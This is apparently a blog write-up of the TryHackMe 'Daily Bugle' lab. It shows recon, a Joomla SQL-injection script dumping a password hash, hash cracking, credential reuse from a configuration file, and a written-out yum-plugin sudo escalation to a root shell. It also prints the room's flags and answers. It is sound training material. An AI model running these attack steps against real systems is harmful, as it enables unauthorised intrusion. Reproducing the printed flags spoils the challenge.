---
layout: post
title: THM — Daily Bugle
date: 2022-09-30 00:00:00 -500
categories: [TryHackMe]
tags: [Gobuster]
---

<img src="/assets/images/THM/Daily%20Bugle/logo.png" alt="Daily Bugle Logo" width="30%">

***
<center><strong><font color="White">Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.</font></strong></center>

***

## <strong><font color="#34A5DA">Reccon</font></strong>

First, nmap scan:
```
vladislav@Mac ~ % nmap -sV -sC 10.10.25.68
Starting Nmap 7.93 ( https://nmap.org ) at 2022-09-30 08:37 MSK
Nmap scan report for 10.10.25.68
Host is up (0.065s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 68ed7b197fed14e618986dc58830aae9 (RSA)
|   256 5cd682dab219e33799fb96820870ee9d (ECDSA)
|_  256 d2a975cf2f1ef5444f0b13c20fd737cc (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40
|_http-generator: Joomla! - Open Source Content Management
|_http-title: Home
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.90 seconds
```

On port 80 there is an http server, let's visit the website:

<img src="/assets/images/THM/Daily%20Bugle/website.png" alt="Daily Bugle Website" width="70%">

> Who robbed the bank? `Spiderman`

Simple SQLi does not work and there are no information about what version of Joomla is it.

Let's use Gobuster to find other subpages:

```console
vladislav@Mac ~ % gobuster dir -u http://10.10.148.251 -w share/wordlists/dirs/dsstorewordlist.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.148.251
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                share/wordlists/dirs/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/30 16:51:58 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 236] [--> http://10.10.148.251/images/]
/robots.txt           (Status: 200) [Size: 836]                                   
/index.php            (Status: 200) [Size: 9280]                                  
/.htaccess            (Status: 403) [Size: 211]                                   
/templates            (Status: 301) [Size: 239] [--> http://10.10.148.251/templates/]
/cache                (Status: 301) [Size: 235] [--> http://10.10.148.251/cache/]    
/includes             (Status: 301) [Size: 238] [--> http://10.10.148.251/includes/] 
/plugins              (Status: 301) [Size: 237] [--> http://10.10.148.251/plugins/]  
/media                (Status: 301) [Size: 235] [--> http://10.10.148.251/media/]    
/modules              (Status: 301) [Size: 237] [--> http://10.10.148.251/modules/]  
/tmp                  (Status: 301) [Size: 233] [--> http://10.10.148.251/tmp/]      
/components           (Status: 301) [Size: 240] [--> http://10.10.148.251/components/]
/bin                  (Status: 301) [Size: 233] [--> http://10.10.148.251/bin/]       
/language             (Status: 301) [Size: 238] [--> http://10.10.148.251/language/]  
/libraries            (Status: 301) [Size: 239] [--> http://10.10.148.251/libraries/] 
/cli                  (Status: 301) [Size: 233] [--> http://10.10.148.251/cli/]       
/administrator        (Status: 301) [Size: 243] [--> http://10.10.148.251/administrator/]
/LICENSE.txt          (Status: 200) [Size: 18092]                                        
/layouts              (Status: 301) [Size: 237] [--> http://10.10.148.251/layouts/]      
/htaccess.txt         (Status: 200) [Size: 3005]                                         
/README.txt           (Status: 200) [Size: 4494]                                         
/configuration.php    (Status: 200) [Size: 0]                                            
/.htpasswd            (Status: 403) [Size: 211]                                          
/.htpasswds           (Status: 403) [Size: 212]                                          
/.user.ini            (Status: 403) [Size: 211]                                          
/web.config.txt       (Status: 200) [Size: 1690]                                         
                                                                                         
===============================================================
2022/09/30 16:52:13 Finished
===============================================================
```

One more wordlist:
```console
vladislav@Mac ~ % gobuster dir -u http://10.10.148.251 -w share/wordlists/dirs/big.txt             
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.148.251
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                share/wordlists/dirs/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/09/30 17:13:03 Starting gobuster in directory enumeration mode
===============================================================
/.htpasswd            (Status: 403) [Size: 211]
/.htaccess            (Status: 403) [Size: 211]
/administrator        (Status: 301) [Size: 243] [--> http://10.10.148.251/administrator/]
/bin                  (Status: 301) [Size: 233] [--> http://10.10.148.251/bin/]          
/cache                (Status: 301) [Size: 235] [--> http://10.10.148.251/cache/]        
/cgi-bin/             (Status: 403) [Size: 210]                                          
/cli                  (Status: 301) [Size: 233] [--> http://10.10.148.251/cli/]          
/components           (Status: 301) [Size: 240] [--> http://10.10.148.251/components/]   
/images               (Status: 301) [Size: 236] [--> http://10.10.148.251/images/]       
/includes             (Status: 301) [Size: 238] [--> http://10.10.148.251/includes/]     
/language             (Status: 301) [Size: 238] [--> http://10.10.148.251/language/]     
/layouts              (Status: 301) [Size: 237] [--> http://10.10.148.251/layouts/]      
/libraries            (Status: 301) [Size: 239] [--> http://10.10.148.251/libraries/]    
/media                (Status: 301) [Size: 235] [--> http://10.10.148.251/media/]        
/modules              (Status: 301) [Size: 237] [--> http://10.10.148.251/modules/]      
/plugins              (Status: 301) [Size: 237] [--> http://10.10.148.251/plugins/]      
/robots.txt           (Status: 200) [Size: 836]                                          
/templates            (Status: 301) [Size: 239] [--> http://10.10.148.251/templates/]    
/tmp                  (Status: 301) [Size: 233] [--> http://10.10.148.251/tmp/]          
                                                                                         
===============================================================
2022/09/30 17:16:02 Finished
===============================================================
```

robots.txt file:
```
User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

Looking at README.txt we can get the version of Joomla.

> What is the Joomla version? `3.7.0`

Moreover, we can use msfconsole to check the version:
```console
umsf6 > se auxiliary/scanner/http/joomla_version
msf6 auxiliary(scanner/http/joomla_version) > set RHOSTS 10.10.148.251
msf6 auxiliary(scanner/http/joomla_version) > run

[*] Server: Apache/2.4.6 (CentOS) PHP/5.6.40
[+] Joomla version: 3.7.0
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

***

## <strong><font color="#34A5DA">Exploitation</font></strong>

As THM suggests, we can search for a python script instead of SQLi. Found <a href="https://github.com/stefanlucas/Exploit-Joomla">this one</a>. Download it via wget and run:
```console
vladislav@Mac ~ % python3 joomblah.py http://10.10.148.251
                                                                                                                    
    .---.    .-'''-.        .-'''-.                                                           
    |   |   '   _    \     '   _    \                            .---.                        
    '---' /   /` '.   \  /   /` '.   \  __  __   ___   /|        |   |            .           
    .---..   |     \  ' .   |     \  ' |  |/  `.'   `. ||        |   |          .'|           
    |   ||   '      |  '|   '      |  '|   .-.  .-.   '||        |   |         <  |           
    |   |\    \     / / \    \     / / |  |  |  |  |  |||  __    |   |    __    | |           
    |   | `.   ` ..' /   `.   ` ..' /  |  |  |  |  |  |||/'__ '. |   | .:--.'.  | | .'''-.    
    |   |    '-...-'`       '-...-'`   |  |  |  |  |  ||:/`  '. '|   |/ |   \ | | |/.'''. \   
    |   |                              |  |  |  |  |  |||     | ||   |`" __ | | |  /    | |   
    |   |                              |__|  |__|  |__|||\    / '|   | .'.''| | | |     | |   
 __.'   '                                              |/'..' / '---'/ /   | |_| |     | |   
|      '                                               '  `'-'`       \ \._,\ '/| '.    | '.  
|____.'                                                                `--'  `" '---'   '---' 

 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'jonah', 'jonah@tryhackme.com', '$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm', '', '']
  -  Extracting sessions from fb9j5_session
```

So, we got username and his password hash. The hash starts with `$2y$` and google says that it's BCrypt. So let's use JohnTheRipper to crack the password:
```console
vladislav@Mac ~ % john joo_pass --format=bcrypt --wordlist=share/wordlists/rockyou.txt --fork=10
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X2])
Cost 1 (iteration count) is 1024 for all loaded hashes
Node numbers 1-10 of 10 (fork)
Press 'q' or Ctrl-C to abort, almost any other key for status
Use the "--show" option to display all of the cracked passwords reliably
Session completed

vladislav@Mac ~ % john joo_pass --format=bcrypt --show                                          
?:spiderman123

```

After running for the first time, it was obvious that it would theoretically take enermous time to crack the pass. So by adding `-fork=10` we use parallelization with 10 processes.

So we get the password: `spiderman123`.

> What is Jonah's cracked password? `spiderman123`

Now we can log into Joomba CMS located at `http://10.10.198.38/administrator/index.php`.

I didn't find any shells or something like that, so went to Google with `Joomla Reverse Shell` and found <a href="https://vk9-sec.com/reverse-shell-on-any-cms/">this article</a>. Following the instruction in this article we can get the reverse shell. However, we are an unpriviliged user. Searching for classic ways of privilege escalation, so let's try some automated tools for searching.

***

## <strong><font color="#34A5DA">Privilege Escalation</font></strong>

Several tools can help you save time during the enumeration process. These tools should only be used to save time knowing they may miss some privilege escalation vectors. Below is a list of popular Linux enumeration tools with links to their respective Github repositories.

The target system’s environment will influence the tool you will be able to use. For example, you will not be able to run a tool written in Python if it is not installed on the target system. This is why it would be better to be familiar with a few rather than having a single go-to tool.

- **LinPeas**: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
- **LinEnum:** [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)
- **LES (Linux Exploit Suggester):** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
- **Linux Smart Enumeration:** [https://github.com/diego-treitos/linux-smart-enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
- **Linux Priv Checker:** [https://github.com/linted/linuxprivchecker](https://github.com/linted/linuxprivchecker)

However, I didn't manage to execute any of these. So I went searching manually. Finally, in `/var/www/html` we can find file `configuration.php` containing next:
```php
<?php
class JConfig {
	public $offline = '0';
	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'The Daily Bugle';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 'root';
	public $password = 'nv5uz9r3ZEDzVjNu';
	public $db = 'joomla';
	public $dbprefix = 'fb9j5_';
	public $live_site = '';
	public $secret = 'UAMBRWzHO3oFPmVC';
	public $gzip = '0';
	public $error_reporting = 'default';
	public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
	public $ftp_host = '127.0.0.1';
	public $ftp_port = '21';
	public $ftp_user = '';
	public $ftp_pass = '';
	public $ftp_root = '';
	public $ftp_enable = '0';
	public $offset = 'UTC';
	public $mailonline = '1';
	public $mailer = 'mail';
	public $mailfrom = 'jonah@tryhackme.com';
	public $fromname = 'The Daily Bugle';
	public $sendmail = '/usr/sbin/sendmail';
	public $smtpauth = '0';
	public $smtpuser = '';
	public $smtppass = '';
	public $smtphost = 'localhost';
	public $smtpsecure = 'none';
	public $smtpport = '25';
	public $caching = '0';
	public $cache_handler = 'file';
	public $cachetime = '15';
	public $cache_platformprefix = '0';
	public $MetaDesc = 'New York City tabloid newspaper';
	public $MetaKeys = '';
	public $MetaTitle = '1';
	public $MetaAuthor = '1';
	public $MetaVersion = '0';
	public $robots = '';
	public $sef = '1';
	public $sef_rewrite = '0';
	public $sef_suffix = '0';
	public $unicodeslugs = '0';
	public $feed_limit = '10';
	public $feed_email = 'none';
	public $log_path = '/var/www/html/administrator/logs';
	public $tmp_path = '/var/www/html/tmp';
	public $lifetime = '15';
	public $session_handler = 'database';
	public $shared_session = '0';
}
```

There is a root password: `nv5uz9r3ZEDzVjNu`. So, we can switch to root. `su root` doesn't work. However, in `/home` directory we can find user `jjameson`. This works. Inside his home directory we can't find user.txt containing flag.

> What is the user flag? `27a260fe3cba712cfdedb1c86d80442e`.

However, we don't have access to `/root` directory. 

```console
sudo -l
Matching Defaults entries for jjameson on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin,
    env_reset, env_keep="COLORS DISPLAY HOSTNAME HISTSIZE KDEDIR LS_COLORS",
    env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES",
    env_keep+="LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE",
    env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User jjameson may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
```

Seraching on gtfobins we can't find to spawn an interactive root shell:
```bash
TF=$(mktemp -d)
cat >$TF/x<<EOF
[main]
plugins=1
pluginpath=$TF
pluginconfpath=$TF
EOF

cat >$TF/y.conf<<EOF
[main]
enabled=1
EOF

cat >$TF/y.py<<EOF
import os
import yum
from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
requires_api_version='2.1'
def init_hook(conduit):
  os.execl('/bin/sh','/bin/sh')
EOF

sudo yum -c $TF/x --enableplugin=y
```

After that we can access `root` directory.

> What is the root flag? `eec3d53292b1821868266858d7fa6f79`